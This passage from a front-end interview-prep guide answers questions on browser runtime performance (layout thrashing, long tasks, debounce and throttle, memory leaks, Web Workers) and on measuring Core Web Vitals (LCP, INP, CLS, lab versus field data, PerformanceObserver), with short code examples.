- "Debounce and throttle are interchangeable" — debounce waits for a pause (final value matters); throttle caps the rate (steady updates matter). Using debounce for a scroll handler makes it fire only after scrolling *stops*.
- "`setTimeout(fn, 0)` yields to the browser fully" — it schedules a macrotask, but a long synchronous chunk still blocks; you must actually split the work.
- "GC means I can't leak memory" — you leak whenever something reachable holds a reference you forgot: a listener, an interval, a closure, a global.
- "Virtualization is premature optimization" — for 10 rows yes; for 10,000 rows, rendering them all is the bug.

**What follows from this topic**

This is the runtime half of web performance. The rendering-pipeline vocabulary here (layout/paint/composite) is the same pipeline the critical-rendering-path and loading topics describe — the difference is *when* it runs. The frame-budget and long-task ideas connect directly to **INP** in the Core Web Vitals topic (a long task is why your click feels slow) and to the **event loop** (long tasks block the queue; rAF and microtasks are how you schedule around them). Web Workers reappear under Web APIs. Once you can reason about main-thread cost, the Measurement topic teaches you to *quantify* it before you touch anything.

### Q1. What's the difference between reflow, repaint, and composite? Which is cheapest?

Three stages of the rendering pipeline that run *after* your JS changes the page:

| Stage | What it does | Triggered by | Cost |
|---|---|---|---|
| **Reflow (layout)** | Recomputes geometry — position and size of boxes | `width`, `height`, `top`, `font-size`, adding/removing DOM, reading `offsetHeight` | Highest — can cascade to the whole document |
| **Repaint** | Refills pixels for already-positioned elements | `color`, `background`, `visibility`, `box-shadow` | Medium — main thread, per-layer |
| **Composite** | Assembles painted layers on the GPU | `transform`, `opacity` (on a promoted layer) | Lowest — often off the main thread |

The pipeline is a waterfall: **layout → paint → composite**. A reflow forces the stages below it (you moved a box, so it must be repainted and recomposited). A repaint forces composite but skips layout. A composite-only change skips both — which is why you animate with `transform` and `opacity`, not `left`/`top`/`width`.

Rule of thumb: **avoid reflow in hot paths** (scroll, animation, resize). If you must animate position, use `transform: translate()`.

### Q2. What is layout thrashing? Show a bad example and fix it.

Layout thrashing is repeatedly forcing **synchronous layout** by interleaving reads and writes of layout properties. Each read (`offsetHeight`, `getBoundingClientRect`, `scrollTop`) after a write forces the browser to reflow *immediately* so it can return a correct value — instead of batching all writes and reflowing once.

```javascript
// BAD — reflows once per iteration (read forces layout after each write)
const boxes = document.querySelectorAll('.box');
for (const box of boxes) {
  const w = box.offsetWidth;        // READ  — forces layout
  box.style.width = w + 10 + 'px';  // WRITE — invalidates layout
}
```

The fix is to **batch all reads, then all writes**:

```javascript
// GOOD — one reflow total
const boxes = document.querySelectorAll('.box');
const widths = [...boxes].map(b => b.offsetWidth);   // all READS first
boxes.forEach((b, i) => {                             // then all WRITES
  b.style.width = widths[i] + 10 + 'px';
});
```

For animations, do the writes inside `requestAnimationFrame` so they land right before paint. Libraries like FastDOM formalize this read/write batching. In DevTools, layout thrashing shows up as repeated purple "Layout" bars in the Performance panel, often flagged "Forced reflow is a likely performance bottleneck."

### Q3. Why is `transform`/`opacity` faster to animate than `top`/`left`/`width`?

Because they can be handled by the **compositor thread on the GPU** without touching layout or paint. When you animate `left`, every frame triggers a reflow (recompute geometry) and repaint (refill pixels) on the main thread. When you animate `transform: translateX()`, the element is already painted into its own layer; the compositor just re-positions that texture on the GPU — no layout, no paint, no main-thread work.

```css
/* Janky — reflow + repaint every frame on the main thread */
.slide { transition: left 300ms; }

/* Smooth — composite-only, runs on the GPU */
.slide { transition: transform 300ms; }
```

To hint the browser to promote an element to its own layer, use `will-change: transform` (or the older `transform: translateZ(0)` hack) — but sparingly, because each layer costs GPU memory and too many layers hurt more than they help. Only `transform` and `opacity` are reliably composite-only; animating `box-shadow` or `background` still repaints.

### Q4. Walk through the 16.6ms frame budget. What has to happen in one frame?

At 60fps you get **1000 / 60 ≈ 16.6ms** per frame. In that window the main thread must fit everything needed to produce the next frame:

```text
|<----------------- ~16.6ms frame budget ----------------->|
[ Input handlers ][ rAF callbacks ][ Style ][ Layout ][ Paint ][ Composite ]
       JS               JS           browser recalc work        GPU
```

If your JavaScript (input handlers + timers + rAF) eats 10ms, the browser has ~6ms left for style/layout/paint/composite. Exceed the budget and the frame is **dropped** — the previous frame stays on screen longer, which the user sees as jank/stutter. On a 120Hz display the budget shrinks to ~8.3ms.

Practical implications: keep per-frame JS well under ~10ms; do visual updates in `requestAnimationFrame` so they align with the frame; move non-visual heavy work off the frame (Web Worker, or chunk it across frames); avoid forcing layout in the frame. You don't need to hit 16.6ms on *every* frame, but sustained overruns during scroll or animation are exactly what "janky" means.

### Q5. What is a long task and how do you break one up?

A **long task** is any single main-thread task that runs over **50ms**. While it runs, nothing else can — clicks queue up, animations freeze, input feels dead. Long tasks are the main cause of poor **INP**. You can observe them:

```javascript
new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('Long task:', entry.duration, 'ms');
  }
}).observe({ type: 'longtask', buffered: true });
```

To break one up, **yield to the main thread** so the browser can handle input and paint between chunks:

```javascript
// Yield helper — lets pending input/render run, then continues
function yieldToMain() {
  return new Promise(resolve => setTimeout(resolve, 0));
}

async function processAll(items) {
  for (let i = 0; i < items.length; i++) {
    doWork(items[i]);
    if (i % 100 === 0) await yieldToMain();  // yield every 100 items
  }
}
```

Better options where available: **`scheduler.yield()`** (yields but keeps priority so your task resumes before other queued work) and **`scheduler.postTask()`** for prioritized scheduling. For pure CPU work with no DOM access (parsing, image processing, crypto), move it entirely to a **Web Worker** so the main thread never blocks.

### Q6. Debounce vs throttle — what's the difference and when do you use each?

Both limit how often a function runs, but with opposite timing:

- **Debounce** — wait until activity *stops* for N ms, then run once. Use when only the **final** value matters: search-as-you-type, autosave, resize-then-recompute.
- **Throttle** — run at most once per N ms *during* activity. Use when you want **steady updates**: scroll position, mousemove, drag, firing analytics.

```javascript
function debounce(fn, delay) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), delay);   // resets on every call
  };
}

function throttle(fn, limit) {
  let waiting = false;
  return (...args) => {
    if (waiting) return;
    fn(...args);
    waiting = true;
    setTimeout(() => (waiting = false), limit); // ignores calls during window
  };
}

searchInput.addEventListener('input', debounce(query, 300));   // fire after typing pauses
window.addEventListener('scroll', throttle(updateHeader, 100)); // fire ~every 100ms while scrolling
```

Mnemonic: debounce = "do it when they're *done*"; throttle = "do it on a *schedule*". Using debounce for a scroll handler is a classic bug — the header only updates after scrolling *stops*.

### Q7. You have a list of 50,000 rows and scrolling is janky. How do you fix it?

Don't render 50,000 DOM nodes. Use **list virtualization (windowing)**: render only the rows currently in the viewport plus a small buffer, and recycle nodes as the user scrolls. The DOM stays at ~20-30 nodes regardless of list length.

The mechanics: a tall spacer element gives the scrollbar the right total height; on scroll you compute which slice of items is visible from `scrollTop / rowHeight` and render just those, absolutely positioned (or translated) to the correct offset.

```javascript
// Sketch: fixed row height, absolute-positioned window
function renderWindow(scrollTop, rowHeight, total, viewportH) {
  const start = Math.floor(scrollTop / rowHeight);
  const count = Math.ceil(viewportH / rowHeight) + 2;   // +2 buffer rows
  const end = Math.min(start + count, total);
  // render items[start..end], each at top = i * rowHeight
  // spacer height = total * rowHeight so the scrollbar is correct
}
```

In practice reach for a library (react-window, TanStack Virtual, or the framework equivalent) — variable row heights and dynamic measurement get fiddly. Pair with a **throttled** scroll handler or an IntersectionObserver, and avoid layout reads inside the scroll handler. Native `content-visibility: auto` can also skip rendering off-screen content with far less code, though with less control over exact windowing.

### Q8. What causes memory leaks in the browser, and how do you find them?

A leak is memory that stays reachable (so GC can't reclaim it) but is no longer needed. The heap grows over a long session until the tab slows or crashes. The usual suspects:

- **Detached DOM nodes** — you removed an element from the document but a JS variable, array, or closure still references it, so the whole subtree stays alive.
- **Forgotten event listeners** — `addEventListener` on `window`/`document` from a component that unmounted; the listener (and everything its closure captures) never gets collected.
- **Uncleared timers** — `setInterval` that's never `clearInterval`'d keeps its callback and captured scope alive forever.
- **Closures capturing large scope** — a returned function that closes over a big array keeps it referenced.
- **Global references / caches** — pushing into a module-level array or Map that's never pruned (an unbounded cache is a leak).
- **Observers** — `IntersectionObserver`/`ResizeObserver`/`MutationObserver` not `disconnect()`ed.

To find them: DevTools **Memory** panel → take a **heap snapshot**, interact, take another, and use "Comparison" to see what grew. Filter by "Detached" to find detached DOM. Use the **Performance monitor** or a timeline recording to watch the JS heap sawtooth — if the baseline climbs after each GC instead of returning flat, you're leaking. The fix is always symmetric cleanup: remove listeners, clear intervals, disconnect observers, null out references (frameworks do this in effect cleanup / `onUnmounted`).

### Q9. Spot the memory leak in this component-style code.

```javascript
function mountWidget(container) {
  const bigData = new Array(1_000_000).fill('x');   // large captured array

  window.addEventListener('resize', onResize);       // never removed
  const id = setInterval(poll, 1000);                // never cleared

  function onResize() { layout(bigData); }
  function poll() { refresh(container); }

  // ... container is later removed from the DOM by the caller
}
```

Three leaks, all because nothing is cleaned up when the widget goes away:

1. **`resize` listener** never removed — `onResize` closes over `bigData` (1M entries) and keeps it alive forever.
2. **`setInterval`** never cleared — `poll` closes over `container`, so even after the caller removes `container` from the DOM it stays referenced (a **detached DOM** leak) and keeps firing.
3. The captured **`bigData`** and **`container`** can never be collected while the listener/timer live.

Fix — return a teardown that reverses every subscription:

```javascript
function mountWidget(container) {
  const bigData = new Array(1_000_000).fill('x');
  const onResize = () => layout(bigData);
  const id = setInterval(() => refresh(container), 1000);
  window.addEventListener('resize', onResize);

  return function unmount() {
    window.removeEventListener('resize', onResize);  // release listener + bigData
    clearInterval(id);                               // release timer + container
  };
}
```

The rule: every `addEventListener`, `setInterval`, observer, or subscription needs a matching teardown tied to the element/component lifecycle.

### Q10. Where should you do visual updates — `setTimeout`, `setInterval`, or `requestAnimationFrame`? Why?

Use **`requestAnimationFrame`** for anything visual. rAF callbacks run **once per frame, just before the browser paints**, so your updates are synced to the display's refresh rate and coalesced with the browser's own rendering.

`setTimeout`/`setInterval` fire on the timer queue at an arbitrary point relative to the frame, so you can update the DOM two or three times between paints (wasted work) or miss the frame entirely (jank). They also keep firing in a **background tab**, whereas rAF pauses when the tab is hidden — saving CPU and battery.

```javascript
// Smooth animation loop, synced to paint, auto-pauses in background tabs
function loop(timestamp) {
  update(timestamp);         // move things
  render();                  // write to the DOM
  requestAnimationFrame(loop);
}
requestAnimationFrame(loop);
```

rAF is also the right place to **batch DOM writes** you computed elsewhere, so they land in the paint phase rather than forcing a mid-frame reflow. For non-visual periodic work (polling an API), a timer is fine — rAF is specifically for things the user sees.

### Q11. How does the browser decide to put something on its own compositor layer, and why does that matter?

The browser promotes an element to its own **compositor layer** (a separately-painted texture the GPU can move independently) when it detects it will be animated or needs isolation — e.g. `will-change: transform`, an active `transform`/`opacity` transition, `position: fixed`, video, canvas, or 3D transforms (`translateZ(0)`).

Why it matters: once an element is on its own layer, animating its `transform`/`opacity` is **composite-only** — the main thread doesn't repaint anything, the compositor just re-positions the existing texture on the GPU. That's how you get buttery 60fps animations that keep running even while the main thread is busy.

The catch is **layer explosion**: each layer consumes GPU memory, and too many layers (or huge ones) cost more to manage than they save — you can make things *slower*. So:

- Add `will-change: transform` right before an animation and remove it after; don't leave it on hundreds of elements.
- Check the DevTools **Layers** panel to see what got promoted and how much memory it uses.
- Promote the thing you're actually animating, not its container.

### Q12. Your React (or any framework) app re-renders too much and feels sluggish. How do you diagnose and fix it?

First **measure, don't guess**. Record a Performance profile while reproducing the slowness and look for long tasks and repeated component work; use the framework's profiler (React DevTools Profiler flame graph) to see which components render and *why*.

Common causes and fixes (framework-agnostic ideas, React names as examples):

- **New object/array/function identities each render** passed as props → children re-render. Fix: stabilize references (`useMemo`/`useCallback`, or hoist constants out).
- **State too high in the tree** → a change re-renders a huge subtree. Fix: colocate state lower, or split contexts so unrelated consumers don't re-render.
- **Expensive derived computation on every render**. Fix: memoize the computation, or precompute.
- **Rendering huge lists**. Fix: virtualization (Q7), not memoization.

```javascript
// Unstable prop identity — child re-renders every parent render
<List onSelect={(id) => open(id)} items={items.filter(Boolean)} />

// Stable — memoized handler + memoized derived data
const onSelect = useCallback((id) => open(id), []);
const visible = useMemo(() => items.filter(Boolean), [items]);
<List onSelect={onSelect} items={visible} />
```

But memoization isn't free (comparison + memory), so apply it where the profiler shows real cost, not everywhere. If the re-renders are cheap, leave them — premature memoization adds complexity for no gain.

### Q13. Explain how `IntersectionObserver` helps runtime performance versus listening to scroll.

A naive "is this element visible?" implementation listens to `scroll` and calls `getBoundingClientRect()` on each candidate — every scroll event, on the main thread, forcing layout reads in the hottest path there is. That's a recipe for jank.

**`IntersectionObserver`** flips it: you register elements and the browser tells you *asynchronously, off the main thread*, when their intersection with the viewport (or a root) crosses a threshold. No per-frame scroll handler, no forced layout, no thrashing.

```javascript
const io = new IntersectionObserver((entries) => {
  for (const e of entries) {
    if (e.isIntersecting) {
      loadImage(e.target);     // lazy-load, fire analytics, start animation...
      io.unobserve(e.target);  // stop watching once handled
    }
  }
}, { rootMargin: '200px' });   // start 200px early

document.querySelectorAll('img[data-src]').forEach(img => io.observe(img));
```

Use it for lazy-loading images/components, infinite scroll (observe a sentinel at the bottom), triggering enter animations, and impression tracking. Remember to `disconnect()` or `unobserve()` when done, or the observer is another leak (Q8).

### Q14. What is a forced synchronous layout (layout trashing's root cause) and how do you avoid it?

The browser normally **batches** style/DOM changes and computes layout once, lazily, before the next paint. A **forced synchronous layout** happens when you *read* a layout-dependent property (`offsetTop`, `offsetHeight`, `getBoundingClientRect`, `scrollHeight`, `getComputedStyle`) *after* having written to the DOM in the same task — the browser must flush pending changes and reflow *right now* to give you a correct answer.

Do that in a loop and you get one forced reflow per iteration (layout thrashing, Q2).

```javascript
// Forces layout on every iteration: write invalidates, next read must reflow
els.forEach(el => {
  el.classList.add('big');            // WRITE (invalidates layout)
  console.log(el.getBoundingClientRect().height); // READ (forces sync reflow)
});
```

Avoid it by **separating the read and write phases**: read all the values you need first (while layout is clean), then apply all the writes. Cache layout values instead of re-reading them in a loop. For visual work, schedule writes in `requestAnimationFrame`. DevTools flags these as "Forced reflow is a likely performance bottleneck" with a purple marker in the Performance timeline.

### Q15. When would you reach for a Web Worker, and what can't it do?

Reach for a **Web Worker** when you have **CPU-heavy work that would block the main thread** and doesn't need the DOM: parsing/processing large JSON or CSV, image manipulation, encryption/hashing, compression, running a WASM module, diffing big datasets, syntax highlighting. The worker runs on its **own thread**, so the main thread stays free to handle input and paint — no jank.

```javascript
// main thread
const worker = new Worker('parse-worker.js');
worker.postMessage(bigPayload);
worker.onmessage = (e) => render(e.data);   // result comes back async

// parse-worker.js
onmessage = (e) => {
  const result = expensiveParse(e.data);     // runs off the main thread
  postMessage(result);
};
```

Constraints: a worker has **no DOM access**, no `window`/`document`, and communicates only by **message passing** (structured-clone copies data, unless you use Transferable objects like `ArrayBuffer` to hand off ownership without copying). It can't directly touch React state or the UI — it computes and returns data, and the main thread renders it. Distinguish from a **Service Worker**, which is a network proxy for caching/offline, not a place to run app compute.

### Q16. A page is smooth on your MacBook but janky on a mid-range phone. Why, and how do you approach it?

Because your machine hides the cost. A phone has a **slower CPU** (long tasks that take 20ms on your laptop take 100ms there), **less memory** (leaks and large heaps bite sooner, GC pauses are longer), a **weaker GPU** (layer/composite budget is smaller), and often a **slower network** — and it may be thermally throttling. The 16.6ms frame budget is the same, but the work that fits into it is far less.

Approach it methodically:

- **Reproduce the constraints locally**: DevTools → Performance → enable **4x/6x CPU throttling** and network throttling. Profile on the throttled profile, not your native one.
- **Test on a real low-end device** if you can — emulation misses GPU and thermal effects.
- **Find the long tasks and forced reflows** in the throttled trace; those are amplified most on weak CPUs.
- **Cut main-thread work**: virtualize long lists, break up long tasks, move compute to a Worker, prefer composite-only animations.
- **Watch memory**: on constrained devices, detached-DOM and cache leaks cause crashes, not just slowness.
- **Verify with field data (RUM)**, not just your lab run — real users' devices are the ground truth (see the Measurement topic).

The mental shift: your dev machine is the best case your users will ever have; design for the p75 device, not yours.

## Core Web Vitals & Measurement

### Summary

**What this topic covers**

You can't optimize what you don't measure — and you'll waste days optimizing the wrong thing if you measure it badly. This topic is about **quantifying front-end performance**: the metrics that matter, how to collect them, and how to read them before touching code. Two concern areas: (1) the **user-centric metrics** — Google's **Core Web Vitals** (**LCP** for loading, **INP** for interactivity, **CLS** for visual stability) plus the supporting cast (**TTFB**, **FCP**, TTI) — what each captures, its "good" threshold, what commonly hurts it, and the fix; and (2) the **tooling and methodology** — **lab (synthetic) vs field (RUM)** data and why they disagree, the browser **Performance APIs** (`performance.now`, `PerformanceObserver`, Navigation/Resource Timing, the `web-vitals` library), the DevTools Performance panel, and the discipline of measuring first. The 15 questions here train you to walk into "the site feels slow" with a plan instead of a guess. Runtime jank (long tasks, layout thrashing) lives in the Runtime topic; this one is about *seeing* it.

**Mental model**

Think of performance measurement as answering three questions in order: **What is the user actually experiencing? Where in the timeline does it go wrong? What is the single biggest cost?** Core Web Vitals map to what the user *feels*: LCP = "did the main content show up?", INP = "did the page respond when I tapped?", CLS = "did things jump around while I was reading?". These are deliberately user-perceived, not machine-internal — a 200ms server response means nothing if the largest image takes 4s. The second mental split is **lab vs field**. Lab data (Lighthouse, DevTools) is a controlled single run on your machine — great for debugging and reproducibility, but it's *one* device on *one* network. Field data (RUM, the Chrome UX Report) is what real users on real devices actually got, aggregated at the **75th percentile** — the ground truth, but noisy and slow to move. You debug in the lab and you *judge success* in the field. The third principle: **measure before and after every change**, because intuition about front-end cost is routinely wrong.

**Key terms**

- **LCP (Largest Contentful Paint)** — time until the largest content element (image, video, text block) is painted. Good: **≤2.5s**. Loading metric.
- **INP (Interaction to Next Paint)** — worst-case (near-worst) latency from a user interaction to the next paint, across the whole visit. Good: **≤200ms**. Replaced **FID** in March 2024. Interactivity metric.
- **CLS (Cumulative Layout Shift)** — sum of unexpected layout shift scores. Good: **≤0.1**. Visual-stability metric.
- **TTFB (Time to First Byte)** — time from navigation to the first response byte; server + network. Feeds LCP.
- **FCP (First Contentful Paint)** — first time *any* content paints. Good: ≤1.8s.
- **TTI (Time to Interactive)** — when the page is reliably responsive; a lab-only, somewhat deprecated metric.
- **Lab / synthetic data** — a controlled single run (Lighthouse, DevTools) in a simulated environment.
- **Field / RUM data** — Real User Monitoring; metrics from actual visitors, reported at the **p75**.
- **CrUX (Chrome UX Report)** — Google's public field dataset powering "Core Web Vitals assessment: passed".
- **PerformanceObserver** — API to subscribe to performance entries (LCP, layout shifts, long tasks, resource timing) as they happen.
- **`web-vitals`** — the small Google library that measures CWV in the field the same way Chrome does.
- **p75** — the 75th percentile; CWV "passes" when 75% of visits meet the threshold.

**Why interviewers ask this**

Because "make it faster" is a senior skill only if you can say *what* faster means and *prove* it. Juniors optimize by vibes — they add lazy loading everywhere and hope. Seniors say "LCP is 4.1s at p75, the LCP element is the hero image, it's not preloaded and TTFB is 900ms — so I'll fix the server response and preload the image, then re-measure in the field." The interviewer is checking three things: do you know the *current* metrics (LCP/INP/CLS and their thresholds, and that INP replaced FID)? Do you understand *why lab and field disagree* (a real senior trap — a green Lighthouse score with failing field data)? And do you have a *methodology* — measure, find the biggest cost, fix that one thing, re-measure — rather than a grab-bag of tips? Being fluent with the Performance APIs and the DevTools panel shows you actually do this, not just read about it.

**Common confusions**

- "FID is still a Core Web Vital" — no, **INP replaced FID** in March 2024. FID only measured the *first* input's delay; INP measures responsiveness across the whole visit.
- "A green Lighthouse score means my users are fine" — Lighthouse is *lab* data on a simulated fast device. Real users on slow phones can still be failing CWV in the field.
- "CLS measures all layout shifts" — only *unexpected* ones; shifts within 500ms of a user interaction are excluded (you asked for them).
- "LCP is when the page finishes loading" — it's when the *largest visible element* paints, which is usually well before full load.
- "TTFB and FCP are the same" — TTFB is the first *byte*; FCP is the first *pixel* of content, which comes later.
- "INP is measured per interaction" — it's reported as (near) the *worst* interaction across the visit, so one slow handler tanks it.

**What follows from this topic**

Measurement is the compass for every other performance topic. LCP points back at the **loading** work (critical path, resource hints, image optimization); INP points straight at the **Runtime** topic (long tasks, the event loop, breaking up work); CLS points at layout stability (reserving space, dimensions on images/ads). The lab-vs-field distinction reappears whenever you deploy: your CI Lighthouse run is lab, your dashboards are field. Once you can measure, the **Rendering Strategies** topic becomes a measurable tradeoff — CSR vs SSR isn't a religious argument, it's an LCP/TTFB/INP curve you can compare with data.

### Q1. What are the three Core Web Vitals, their thresholds, and what each measures?

Three metrics, each covering a different dimension of user experience, each with a "good" threshold measured at the **75th percentile** of real visits:

| Vital | Measures | Good | Needs work | Poor |
|---|---|---|---|---|
| **LCP** — Largest Contentful Paint | **Loading** — when the largest content element paints | ≤ 2.5s | ≤ 4s | > 4s |
| **INP** — Interaction to Next Paint | **Interactivity** — responsiveness to user input across the visit | ≤ 200ms | ≤ 500ms | > 500ms |
| **CLS** — Cumulative Layout Shift | **Visual stability** — how much content unexpectedly moves | ≤ 0.1 | ≤ 0.25 | > 0.25 |

- **LCP** answers "did the main thing show up fast?" — usually the hero image or headline.
- **INP** answers "when I tapped/typed, did the page respond?" — it superseded FID in March 2024 and captures the (near-)worst interaction latency of the whole session, not just the first.
- **CLS** answers "did stuff jump around while I was reading/tapping?" — it's unitless (a score, not time).

A page "passes Core Web Vitals" only when it meets all three thresholds at p75 in field data. These three are what Google uses for the search-ranking signal, which is why they get outsized attention.

### Q2. INP replaced FID — what's the difference and why did they change it?

**FID (First Input Delay)** only measured the delay before the browser *started* processing the **first** interaction — and only the input delay, not the handler work or the render. It was easy to pass (most first inputs happen early, before the main thread is busy) and didn't reflect the many interactions later in a session.

**INP (Interaction to Next Paint)** measures the **full** latency of interactions — input delay + event handler processing + the next paint — for *all* interactions across the visit, and reports the worst (technically near-worst, excluding a few outliers on high-interaction pages).

```text
FID:  [ input delay ] | handler runs...            (only measures this gap, first input only)
INP:  [ input delay ][ handler processing ][ presentation delay ]   (whole thing, every interaction)
       tap ......................................... next paint
```

They changed it because FID gave a falsely rosy picture — sites passed FID while feeling unresponsive on later interactions (a slow dropdown, a laggy filter). INP correlates far better with perceived responsiveness. The practical consequence: INP sends you straight to the **Runtime** topic — long tasks, heavy event handlers, and main-thread blocking are what hurt it, and breaking up work / yielding to the main thread is the fix.

### Q3. What is CLS, how is it scored, and how do you fix a high CLS?

**CLS** sums the scores of **unexpected layout shifts** — content that moves *after* it was already painted, without a user action causing it. Each shift's score = **impact fraction** (how much of the viewport moved) × **distance fraction** (how far it moved). Shifts within 500ms of a user interaction are excluded (you clicked "expand", so that shift is expected). Good is **≤ 0.1**.

Classic causes and fixes:

- **Images/video without dimensions** — reserve space with `width`/`height` attributes or CSS `aspect-ratio` so the browser lays out the box before the asset loads.
- **Ads/embeds/iframes** that inject after load — reserve a fixed-size container.
- **Web fonts** causing FOUT/reflow (text reflows when the custom font swaps) — use `font-display: optional`/`swap` thoughtfully and preload the font.
- **Dynamically injected content** (banners, "cookie" bars) pushing content down — reserve space or overlay instead of insert.
- **Actions that shift content** — animate with `transform`, not by changing layout properties.

```html
<!-- Bad: no dimensions → content below jumps when the image loads -->
<img src="/hero.jpg" alt="hero" />

<!-- Good: box is reserved before load, no shift -->
<img src="/hero.jpg" alt="hero" width="1200" height="600" />
```

The mental rule: **reserve space for anything that arrives late.**

### Q4. What's the difference between lab and field data, and why do they disagree?

**Lab (synthetic) data** is a controlled single run in a simulated environment — Lighthouse, DevTools, a CI performance test. Same device, same network, repeatable. Great for *debugging* and catching regressions before deploy.

**Field (RUM) data** is Real User Monitoring — metrics collected from *actual visitors* on their own devices and networks, aggregated (usually at p75). Google's **CrUX** report is the canonical public field dataset and the source of the "passed/failed" assessment in Search Console. This is *ground truth* for user experience.

They disagree because they measure different worlds:

- **Device & network**: lab runs on a fast simulated device; your real users include slow phones on 3G.
- **INP especially**: lab tools can only *estimate* interactivity (there's no real user clicking); field INP comes from real interactions, so it's routinely worse.
- **Caching & state**: lab is often a cold load; real users have warm caches, logged-in states, A/B variants.
- **Geography**: lab runs from one location; users are global, with varying TTFB.
- **Aggregation**: lab is one number; field is a p75 across a distribution.

The discipline: **debug in the lab, judge success in the field.** A green Lighthouse score with failing CrUX is common and means your test environment is kinder than reality.

### Q5. Walk me through diagnosing a slow-loading page. Where do you start?

Start by **measuring, not fixing.** The order:

1. **Get field data first** — Search Console / CrUX to see which CWV is actually failing at p75 (LCP? INP? CLS?) and on which devices (mobile usually). This tells you what real users hit.
2. **Reproduce in the lab** — run Lighthouse and record a DevTools Performance trace with **CPU + network throttling** matched to your users (e.g. 4x CPU, Slow 4G). Don't profile on your native fast machine.
3. **Find the biggest single cost.** For LCP: identify the LCP element (DevTools flags it) and break its time into TTFB + resource load + render delay. For INP: find the long tasks and heavy handlers. For CLS: find the shifting elements in the Experience section.
4. **Fix that one thing**, then **re-measure** — confirm the metric moved. One change at a time so you know what worked.
5. **Ship and watch the field** — lab improvement is a hypothesis; the field confirms it (and field data lags days/weeks).

The anti-pattern is skipping to step 4 with a checklist of "best practices" and adding lazy-loading, preloads, and memoization blindly. Measure first, fix the dominant cost, verify.

### Q6. How do you measure timing precisely in JavaScript? Why not `Date.now()`?

Use **`performance.now()`**, not `Date.now()`. Two reasons: it's a **high-resolution monotonic clock** (sub-millisecond, fractional) measured from page navigation start, and it's **monotonic** — it never jumps backward due to NTP adjustments or the user changing the system clock, which `Date.now()` can do mid-measurement.

```javascript
const start = performance.now();
doExpensiveWork();
const duration = performance.now() - start;   // fractional ms, reliable
console.log(`Took ${duration.toFixed(2)}ms`);
```

For structured measurement use the **User Timing API** — `performance.mark()` and `performance.measure()` — which also surface as labelled bars in the DevTools Performance panel:

```javascript
performance.mark('parse-start');
parse(data);
performance.mark('parse-end');
performance.measure('parse', 'parse-start', 'parse-end');
// shows up in DevTools + retrievable via performance.getEntriesByName('parse')
```

`Date.now()` is for wall-clock timestamps (when did this happen), not for measuring *durations*.

### Q7. What is `PerformanceObserver` and what can you observe with it?

`PerformanceObserver` lets you **subscribe to performance entries as they're recorded**, instead of polling `performance.getEntries()`. It's the modern, non-blocking way to collect metrics — including ones that only the browser can know, like when the largest element painted or when a layout shift happened.

```javascript
// Observe the Largest Contentful Paint
new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lcp = entries[entries.length - 1];   // last LCP candidate wins
  console.log('LCP:', lcp.startTime, lcp.element);
}).observe({ type: 'largest-contentful-paint', buffered: true });
```

Entry types you can observe include:

- **`largest-contentful-paint`** — LCP candidates.
- **`layout-shift`** — each shift (sum them for CLS).
- **`event` / `first-input`** — interaction timing (basis for INP).
- **`longtask`** — main-thread tasks > 50ms.
- **`navigation`** — Navigation Timing (TTFB, DOMContentLoaded, load).
- **`resource`** — Resource Timing for every fetched asset.
- **`paint`** — FP and FCP.

`buffered: true` replays entries that occurred *before* the observer was created — important because LCP/FCP happen early. In practice you rarely wire these by hand; the **`web-vitals`** library does it correctly for you (Q8).

### Q8. How would you collect Core Web Vitals from real users (RUM)?

Use Google's **`web-vitals`** library — it measures LCP, INP, and CLS the exact way Chrome/CrUX does (including the tricky bits: LCP's "last candidate", CLS session windows, INP's worst-interaction logic) and calls you back with the final value, which you send to your analytics endpoint.

```javascript
import { onLCP, onINP, onCLS } from 'web-vitals';

function send(metric) {
  // metric = { name, value, rating, id, delta, ... }
  navigator.sendBeacon('/analytics', JSON.stringify(metric));
}

onLCP(send);
onINP(send);   // fires on visibility change / page hide — INP needs the whole visit
onCLS(send);
```

Key details:

- Use **`navigator.sendBeacon`** (or `fetch` with `keepalive`) so the report survives the page unloading.
- INP and CLS are **finalized late** (on `visibilitychange`/page hide) because they aggregate over the visit — you can't read them at load time.
- Report the **p75** across users on your dashboard to match how CWV is judged; a single average hides the slow tail.
- Segment by device type, country, and page — the aggregate hides where the real problems are.

This is your field data. It's the ground truth that lab tools only approximate, and it's what tells you whether a deploy actually helped real users.

### Q9. What commonly hurts LCP and how do you fix each cause?

LCP breaks down into **TTFB + resource load time + render delay** for the largest element (usually the hero image or headline). Attack whichever segment dominates:

- **Slow TTFB** (slow server, no CDN, no caching) → cache/CDN the HTML, faster backend, consider SSG/ISR (Rendering topic). TTFB is the floor under LCP.
- **LCP image discovered late** (referenced by CSS `background-image` or injected by JS, so the preload scanner misses it) → make it a real `<img>` and **`<link rel="preload">`** it; add `fetchpriority="high"`.
- **Large unoptimized image** → modern format (AVIF/WebP), correct dimensions, responsive `srcset`, compression.
- **Render-blocking CSS/JS** delaying paint → inline critical CSS, defer non-critical JS.
- **Client-side rendering** where the hero only appears after the JS bundle downloads, parses, and renders → SSR/SSG the above-the-fold content.
- **Web font blocking text render** → `font-display: swap`, preload the font.

```html
<!-- Preload + prioritize the LCP image so it isn't discovered late -->
<link rel="preload" as="image" href="/hero.avif" fetchpriority="high" />
```

The first move is always to **identify the LCP element** (DevTools marks it) and measure which segment — server, network, or render — is the bottleneck, then fix that one.

### Q10. What commonly hurts INP and how do you fix it?

INP is a **main-thread** problem: it measures input delay + handler processing + next paint, and it's dominated by the main thread being busy. Causes and fixes:

- **Long tasks blocking input** — a big JS chunk (hydration, third-party script, heavy computation) means the browser can't even start your handler. Fix: break up long tasks, yield to the main thread (`scheduler.yield()`), code-split, defer third-parties.
- **Heavy event handlers** — the click handler itself does too much synchronously (filter 10k items, big DOM update). Fix: do the minimum needed for the next paint, defer the rest, debounce/throttle.
- **Expensive re-renders after the interaction** — the framework re-renders a huge subtree before painting. Fix: reduce re-render scope, virtualize lists, memoize the expensive parts.
- **Layout thrashing in the handler** (Runtime topic) — reading layout after writing forces sync reflow. Fix: batch reads then writes.
- **Large DOM** making style/layout recalc slow after every interaction. Fix: shrink the DOM, virtualize.

```javascript
// Bad INP: handler does everything synchronously before paint
button.onclick = () => { const r = filterHugeList(items); render(r); };

// Better: show feedback now, do heavy work after yielding so paint happens
button.onclick = async () => {
  showSpinner();
  await scheduler.yield?.() ?? new Promise(r => setTimeout(r));
  render(filterHugeList(items));
};
```

INP is the metric that most directly sends you to the **Runtime & Rendering** topic — it *is* main-thread responsiveness.
